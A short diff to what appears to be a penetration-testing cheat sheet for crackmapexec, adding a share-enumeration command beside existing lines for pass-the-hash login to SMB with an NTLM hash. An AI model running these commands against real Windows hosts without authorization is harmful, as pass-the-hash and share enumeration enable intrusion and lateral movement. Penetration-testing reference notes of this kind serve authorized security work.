@@ -6,6 +6,12 @@
 crackmapexec smb <TARGET_IP> -d <DOMAIN> -u Administrator -H <NTLM HASH>
 ```
 
+### Shares enumeration
+
+```csharp
+crackmapexec smb 10.110.0.222  -u 'CROOK\homer_potter' -p $PASS --shares
+```
+
 ### Executing a command on a provided hosts list
 
 ```csharp
